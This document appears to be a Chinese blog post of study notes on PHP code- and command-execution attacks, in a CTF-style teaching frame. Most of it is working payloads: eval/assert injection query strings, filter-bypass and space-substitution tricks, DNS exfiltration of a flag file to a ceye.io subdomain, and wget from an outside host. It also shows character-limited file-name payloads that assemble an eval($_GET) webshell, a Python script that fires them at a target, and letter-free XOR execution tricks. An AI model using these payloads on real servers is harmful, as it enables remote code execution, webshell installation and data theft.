# 安全牛代码/命令执行学习笔记

<div class="has-toc have-toc">
</div>

## 0x00 代码执行相关函数

菜刀不支持php7。

`eval(string code_str)`把字符串作为PHP代码执行，Code_str是PHP代码字符串。<figure class="wp-block-image size-full">

<img loading="lazy" width="396" height="141" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-114.png" alt="" class="wp-image-2668" /> </figure> 

`assert ($assertion [, string $description ] )` 检查一个断言是否为FALSE，assertion是字符串，它将会被当做PHP代码来执行。<figure class="wp-block-image size-full">

<img loading="lazy" width="781" height="368" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-113.png" alt="" class="wp-image-2667" /> </figure> 

`call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )`callback是将被调用的回调函数，parameter是0个或以上的参数，被传入回调函数。可以传递任何内置的或者用户自定义的函数，除了语言结构如array()，echo()，empty()，eval()，exit()，isset()，list()，print() 和 unset()。<figure class="wp-block-image size-full">

<img loading="lazy" width="586" height="214" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-115.png" alt="" class="wp-image-2672" /> </figure> 

`call_user_func_array ( callable $callback , array $param_arr )`callback被调用的回调函数，param_arr要被传入回调函数的数组。<figure class="wp-block-image size-full">

<img loading="lazy" width="441" height="170" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-117.png" alt="" class="wp-image-2675" /> </figure> 

`create_function ( string $args , string $code )`创建一个匿名（lambda 风格）函数，args是要创建的函数的参数，code是函数内的代码。<figure class="wp-block-image size-full">

<img loading="lazy" width="683" height="315" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-118.png" alt="" class="wp-image-2676" /> </figure> 

`preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )`执行一个正则表达式的搜索和替换。`/e` 修正符使 preg_replace将 replacement 参数当做 PHP 代码【在适当的逆向引用和替换完之后】只有匹配上了才会执行。<figure class="wp-block-image size-full">

<img loading="lazy" width="760" height="80" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-121.png" alt="" class="wp-image-2680" /></figure> 

`array_map ( callable $callback , array $array1 [, array $... ] )`为数组的每个元素应用回调函数<figure class="wp-block-image size-full">

<img loading="lazy" width="404" height="184" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-122.png" alt="" class="wp-image-2684" /> </figure> 

范例：url?a=assert&b=phpinfo()

如果注释掉$array[0]=$b，修改$array=$b，范例应为url?a=assert&b[]=phpinfo() 

`usort ( array &$array , callable $value_compare_func )`使用用户自定义的比较函数对数组中的值进行排序。<figure class="wp-block-image size-full">

<img loading="lazy" width="414" height="195" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-123.png" alt="" class="wp-image-2689" /> </figure> 

注释的范例：url?1[]=phpinfo()&1[]=，需要转两个参数比较，执行的命令必须放在第一位。

`uasort ( array &$array , callable $value_compare_func )`使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。<figure class="wp-block-image size-full">

<img loading="lazy" width="606" height="143" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-124.png" alt="" class="wp-image-2693" /> </figure> 

范例：url?pass=phpinfo() 

`${php代码}`<figure class="wp-block-image size-full">

<img loading="lazy" width="394" height="135" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-125.png" alt="" class="wp-image-2695" /> </figure> 

## 0x01 命令执行相关函数及各类命令执行绕过技巧

`system(string command, int &return_var)`可以用来执行系统命令并将相应的执行结果输出。<figure class="wp-block-image size-full">

<img loading="lazy" width="552" height="166" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-126.png" alt="" class="wp-image-2697" /> </figure> 

`exec (string command, array &output, int &return_var)`command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。  
命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。  
如果想要获取命令的输出内容， 请确保使用 output 参数。<figure class="wp-block-image size-full">

<img loading="lazy" width="870" height="218" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-127.png" alt="" class="wp-image-2698" /> </figure> 

`passthru (string command, int &return_var)`command是要执行的命令，return_var存放执行命令后的状态值。<figure class="wp-block-image size-full">

<img loading="lazy" width="491" height="133" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-128.png" alt="" class="wp-image-2699" /> </figure> 

`shell_exec (string command)`command是要执行的命令。<figure class="wp-block-image size-full">

<img loading="lazy" width="551" height="129" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-129.png" alt="" class="wp-image-2700" /> </figure> 

` `` `运算符，与shell_exec功能相同，执行shell命令并返回输出的字符串。<figure class="wp-block-image size-full">

<img loading="lazy" width="436" height="159" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-130.png" alt="" class="wp-image-2701" /> </figure> 

`ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )`打开输出控制缓冲。范例：url?a=ls，注意php7中无效。<figure class="wp-block-image size-full">

<img loading="lazy" width="383" height="185" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-131.png" alt="" class="wp-image-2703" /> </figure> 

命令执行的分隔符：

<pre class="wp-block-code"><code>换行符     %0a
回车符     %0d
连续指令   ;
后台进程   &
管道符     |
(逻辑?)    ||  &&</code></pre>

命令执行的空格代替：

<pre class="wp-block-code"><code>&lt;符号
$IFS
${IFS}
$IFS$9
%09用于url传递</code></pre>

命令执行的绕过：

<pre class="wp-block-code"><code>a=l;b=s;$a$b

`echo d2hvYW1p|base64 -d`base64编码</code></pre>

"substr string pos len"用法示例。该表达式是从string中取出从pos位置开始长度为len的子字符串。如果pos或len为非正整数时，将返回空字符串。一些用法范例：

<pre class="wp-block-code"><code>echo "${PATH:0:1}"
echo "`expr$IFS\substr\$IFS\$(pwd)\$IFS\1\$IFS\1`"
echo `$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)`
expr${IFS}substr${IFS}$SESSION_MANAGER${IFS}6${IFS}1</code></pre>

$(pwd)与pwd的区别在于更明确，$PWD是环境变量。<figure class="wp-block-image size-full">

<img loading="lazy" width="759" height="217" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-132.png" alt="" class="wp-image-2710" /> </figure> 

## 0x02 命令执行无回显的判断方法

命令无回显时的判断：延时（sleep time）、HTTP请求（curl ip:port+自己的服务器nc -lv port）、DNS请求（curl或ping域名+ceye等平台）。

利用：写shell（直接写入/外部下载）、http/dns等方式带出数据。

范例1：ping=\`cat flag.txt|sed /[[:space:]]//\`.xxx.ceye.io

## 0x03 可控字符串长度受限情况下Getshell

### **15个字符**

`wget a.cn/1`<span class="has-inline-color has-vivid-red-color">-></span>`mv 1 1.php`

`echo \<?php >1`<span class="has-inline-color has-vivid-red-color">-></span>`echo eval\(>>1`<span class="has-inline-color has-vivid-red-color">-></span>`echo \$_GET>>1`<span class="has-inline-color has-vivid-red-color">-></span> `echo \[1\]>>1`<span class="has-inline-color has-vivid-red-color">-></span> `<code>echo \)\;>>1`<span class="has-inline-color has-vivid-red-color">-></span> mv 1 1.php</code>

### 7个字符

预备知识，参考<a href="https://www.freesion.com/article/7875567520/" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.freesion.com/article/7875567520/</a>

<pre class="wp-block-code"><code>>a    #虽然没有输入但是会创建a这个文件
ls -t    #ls基于基于事件排序（从晚到早）
sh a    #sh会把a里面的每行内容当作命令来执行
使用|进行命令拼接    #l\ s    =    ls
base64    #使用base64编码避免特殊字符</code></pre>

`<?php eval($_GET[1]);`进行base64加密，需要被执行的语句：`echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php`

payload:

<pre class="wp-block-code"><code>>hp
>1.p\\
>d\>\\
>\ -\\
>e64\\
>bas\\
>7\|\\
>XSk\\
>Fsx\\
>dFV\\
>kX0\\
>bCg\\
>XZh\\
>AgZ\\
>waH\\
>PD9\\
>o\ \\
>ech\\
ls -t>0
sh 0</code></pre>
脚本代码：

```python
import requests

url = "http://192.168.61.157/rce.php?1={0}"
print("[+]start attack!!!")
with open("payload.txt","r") as f:
	for i in f:
		print("[*]" + url.format(i.strip()))
		requests.get(url.format(i.strip()))

#检查是否攻击成功
test = requests.get("http://192.168.61.157/1.php")
if test.status_code == requests.codes.ok:
	print("[*]Attack success!!!")
```

### **5个字符**

解决ls -t>0，a在排序在l前符号后，可以使用下面的方法拆分。

<pre class="wp-block-code"><code>>ls\\
ls>a
>\ \\
>-t\\
>\>0
ls>>a</code></pre>

参考：<a rel="noreferrer noopener" href="https://www.freesion.com/article/8743881775/" target="_blank" rel="nofollow" >https://www.freesion.com/article/8743881775/</a>、<a href="https://www.freesion.com/article/49311037498/" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.freesion.com/article/49311037498/</a>

输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数

<pre class="wp-block-code"><code>>id
>root
* （等同于命令：id root）</code></pre>

增加字母来限定被用来当作命令和参数的文件

<pre class="wp-block-code"><code>>ls
>lss
>lsss
>1
*s (等同于命令：ls lss lsss)
*使第一个列出的文件名（ls）当作命令，剩下的文件名当作参数，而*后面的s有限制了只有含有s的字符串才能当做参数</code></pre><figure class="wp-block-image">

![在这里插入图片描述][1] </figure> 

通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）

<pre class="wp-block-code"><code>>rev
echo 1234 > v
*v （等同于命令：rev v）</code></pre><figure class="wp-block-image">

![在这里插入图片描述][2] </figure> 

IFS来代替空格，有时候一条命令中可能要有多个空格，而这样的话用上面的方法拼接命令是就会生成相同名的文件（空格），会造成覆盖，所以要用‘{IFS}\`等符号来代替一个空格。

将创建的文件可以排成理想的顺序

**思路1：(存在局限性，环境不一样，结果可能不一样，\\长度只能算1)**

<pre class="wp-block-code"><code># ls ‐t>q
>-t\\
>\>q
>l\\
>s\ \\
ls>a
ls>>a</code></pre>

ls>a之后文件内容为<figure class="wp-block-image">

![在这里插入图片描述][3] </figure> 

在ls>>a 得到的结果为<figure class="wp-block-image">

![在这里插入图片描述][4] </figure> 

**思路2：**

用dir来代替ls不换行输出；rev将文件内容反向输出，目的是将`ls ‐th >f`写入文件，-h选项的意思是生成的结果有利于人看，也就是不是用默认的byte做单位，而是根据实际情况调整。h的存在只为了能够利用字典顺序，即`f`在`ht-`前，`ht-`在`sl`前，这就按照字母顺序写入了v，v再反向输出一下就得到了ls ‐th >f。

<pre class="wp-block-code"><code>>dir
>f\>
>ht-
>sl

*>v (等同于命令：dir "f>" "ht‐" "sl" > v ，先将反向命令的写入中间文件v，文件v中的内容为f> ht- sl （dir写入文件自动加空格，所以不需要在用“\”来转义空格了））
>rev
>*v>a (等同于命令：rev v > a)(a里面的内容为:ls ‐th >f)</code></pre>

后期再传入攻击payload或执行其他命令时，通过sh执行a文件即可生成f文件，得到的f文件里就是我们想要执行的命令或木马。反弹shell和上传Webshell马可参考链接。

### 4个字符

思路与上面的相似。

```
>dir
>f\>
>ht-
>sl

*>v (等同于命令：dir "f>" "ht‐" "sl" > v ，先将反向命令的写入中间文件v，文件v中的内容为f> ht- sl （dir写入文件自动加空格，所以不需要在用“\”来转义空格了））
>rev
>*v>a (等同于命令：rev v > a)(a里面的内容为:ls ‐th >f)
```


## 0x04 无数字字母的命令执行

将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符

**异或**

任何字母与0异或，最后得到的都是它本身。

```php
<?php
$a = '~!@#$%^&*()_+\|/?.,<>`-={}[]';
for($i = 0;$i<strlen($a);$i++){
	for($j = 0;$j<strlen($a);$j++){
		if(ord($a[$i]^$a[$j])>64 && ord($a[$i]^$a[$j])<91){
			echo $a[$i].'xor'.$a[$j].'is ';
			echo chr(ord($a[$i]^$a[$j])).' ';
			echo ord($a[$i]^$a[$j]);
			echo "\n";
		}elseif (ord($a[$i]^$a[$j])>96 && ord($a[$i]^$a[$j])<122){
			echo $a[$i].'xor'.$a[$j].'is ';
			echo chr(ord($a[$i]^$a[$j])).' ';
			echo ord($a[$i]^$a[$j]);
			echo "\n";
			}
	}
}
?>
```


运行结果：

<pre class="wp-block-code"><code>~xor$is Z 90
~xor&is X 88
~xor*is T 84
~xor(is V 86
~xor)is W 87
~xor+is U 85
~xor/is Q 81
~xor?is A 65
~xor.is P 80
~xor,is R 82
~xor&lt;is B 66
~xor-is S 83
~xor=is C 67
!xor@is a 97
!xor`is A 65
!xor{is Z 90
@xor!is a 97
@xor#is c 99
@xor$is d 100
@xor%is e 101
@xor&is f 102
@xor*is j 106
@xor(is h 104
@xor)is i 105
@xor+is k 107
@xor/is o 111
@xor.is n 110
@xor,is l 108
@xor-is m 109
#xor@is c 99
#xor`is C 67
#xor{is X 88
#xor&#91;is x 120
$xor~is Z 90
$xor@is d 100
$xor\is x 120
$xor|is X 88
$xor`is D 68
$xor}is Y 89
$xor]is y 121
%xor@is e 101
%xor\is y 121
%xor|is Y 89
%xor`is E 69
%xor}is X 88
%xor]is x 120
^xor&is x 120
^xor*is t 116
^xor(is v 118
^xor)is w 119
^xor+is u 117
^xor/is q 113
^xor?is a 97
^xor.is p 112
^xor,is r 114
^xor&lt;is b 98
^xor-is s 115
^xor=is c 99
&xor~is X 88
&xor@is f 102
&xor^is x 120
&xor_is y 121
&xor|is Z 90
&xor`is F 70
*xor~is T 84
*xor@is j 106
*xor^is t 116
*xor_is u 117
*xor\is v 118
*xor|is V 86
*xor`is J 74
*xor{is Q 81
*xor}is W 87
*xor&#91;is q 113
*xor]is w 119
(xor~is V 86
(xor@is h 104
(xor^is v 118
(xor_is w 119
(xor\is t 116
(xor|is T 84
(xor`is H 72
(xor{is S 83
(xor}is U 85
(xor&#91;is s 115
(xor]is u 117
)xor~is W 87
)xor@is i 105
)xor^is w 119
)xor_is v 118
)xor\is u 117
)xor|is U 85
)xor`is I 73
)xor{is R 82
)xor}is T 84
)xor&#91;is r 114
)xor]is t 116
_xor&is y 121
_xor*is u 117
_xor(is w 119
_xor)is v 118
_xor+is t 116
_xor/is p 112
_xor.is q 113
_xor,is s 115
_xor&lt;is c 99
_xor>is a 97
_xor-is r 114
_xor=is b 98
+xor~is U 85
+xor@is k 107
+xor^is u 117
+xor_is t 116
+xor\is w 119
+xor|is W 87
+xor`is K 75
+xor{is P 80
+xor}is V 86
+xor&#91;is p 112
+xor]is v 118
\xor$is x 120
\xor%is y 121
\xor*is v 118
\xor(is t 116
\xor)is u 117
\xor+is w 119
\xor/is s 115
\xor?is c 99
\xor.is r 114
\xor,is p 112
\xor>is b 98
\xor-is q 113
\xor=is a 97
|xor$is X 88
|xor%is Y 89
|xor&is Z 90
|xor*is V 86
|xor(is T 84
|xor)is U 85
|xor+is W 87
|xor/is S 83
|xor?is C 67
|xor.is R 82
|xor,is P 80
|xor>is B 66
|xor-is Q 81
|xor=is A 65
/xor~is Q 81
/xor@is o 111
/xor^is q 113
/xor_is p 112
/xor\is s 115
/xor|is S 83
/xor`is O 79
/xor{is T 84
/xor}is R 82
/xor&#91;is t 116
/xor]is r 114
?xor~is A 65
?xor^is a 97
?xor\is c 99
?xor|is C 67
?xor{is D 68
?xor}is B 66
?xor&#91;is d 100
?xor]is b 98
.xor~is P 80
.xor@is n 110
.xor^is p 112
.xor_is q 113
.xor\is r 114
.xor|is R 82
.xor`is N 78
.xor{is U 85
.xor}is S 83
.xor&#91;is u 117
.xor]is s 115
,xor~is R 82
,xor@is l 108
,xor^is r 114
,xor_is s 115
,xor\is p 112
,xor|is P 80
,xor`is L 76
,xor{is W 87
,xor}is Q 81
,xor&#91;is w 119
,xor]is q 113
&lt;xor~is B 66
&lt;xor^is b 98
&lt;xor_is c 99
&lt;xor{is G 71
&lt;xor}is A 65
&lt;xor&#91;is g 103
&lt;xor]is a 97
>xor_is a 97
>xor\is b 98
>xor|is B 66
>xor{is E 69
>xor}is C 67
>xor&#91;is e 101
>xor]is c 99
`xor!is A 65
`xor#is C 67
`xor$is D 68
`xor%is E 69
`xor&is F 70
`xor*is J 74
`xor(is H 72
`xor)is I 73
`xor+is K 75
`xor/is O 79
`xor.is N 78
`xor,is L 76
`xor-is M 77
-xor~is S 83
-xor@is m 109
-xor^is s 115
-xor_is r 114
-xor\is q 113
-xor|is Q 81
-xor`is M 77
-xor{is V 86
-xor}is P 80
-xor&#91;is v 118
-xor]is p 112
=xor~is C 67
=xor^is c 99
=xor_is b 98
=xor\is a 97
=xor|is A 65
=xor{is F 70
=xor&#91;is f 102
{xor!is Z 90
{xor#is X 88
{xor*is Q 81
{xor(is S 83
{xor)is R 82
{xor+is P 80
{xor/is T 84
{xor?is D 68
{xor.is U 85
{xor,is W 87
{xor&lt;is G 71
{xor>is E 69
{xor-is V 86
{xor=is F 70
}xor$is Y 89
}xor%is X 88
}xor*is W 87
}xor(is U 85
}xor)is T 84
}xor+is V 86
}xor/is R 82
}xor?is B 66
}xor.is S 83
}xor,is Q 81
}xor&lt;is A 65
}xor>is C 67
}xor-is P 80
&#91;xor#is x 120
&#91;xor*is q 113
&#91;xor(is s 115
&#91;xor)is r 114
&#91;xor+is p 112
&#91;xor/is t 116
&#91;xor?is d 100
&#91;xor.is u 117
&#91;xor,is w 119
&#91;xor&lt;is g 103
&#91;xor>is e 101
&#91;xor-is v 118
&#91;xor=is f 102
]xor$is y 121
]xor%is x 120
]xor*is w 119
]xor(is u 117
]xor)is t 116
]xor+is v 118
]xor/is r 114
]xor?is b 98
]xor.is s 115
]xor,is q 113
]xor&lt;is a 97
]xor>is c 99
]xor-is p 112</code></pre>

'\[@\]\['^'=,<<'得到flag字符。利用$\_= '[@\]['^'=,<<' ;$\_();能够执行函数。

**取反**

和的url编码为`%e5%92%8c`。<figure class="wp-block-image size-full">

<img loading="lazy" width="382" height="302" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-165.png" alt="" class="wp-image-2863" /> </figure> 

**自增**<figure class="wp-block-image size-full">

<img loading="lazy" width="550" height="227" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-166.png" alt="" class="wp-image-2864" /> </figure> 

在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 `$a = 'Z'; $a++;` 将把 `$a` 变成`'AA'`，而在 C 中，`a = 'Z'; a++;` 将把 `a` 变成 `'['`（`'Z'` 的 ASCII 值是 90，`'['` 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。

提供了一种思路，利用其他方式获取一个字母后，能通过以上操作得出其他字母。

[1]: https://www.freesion.com/images/969/c9db6635dd9abcdf077f27576aef5e59.png
[2]: https://www.freesion.com/images/163/0c566f59f77d40f4bcd7d55bd4976833.png
[3]: https://www.freesion.com/images/385/ee52a107b1a0028e7883d34d156cb511.png
[4]: https://www.freesion.com/images/191/b6c3bb8ddefff62d99609983f27284a7.png
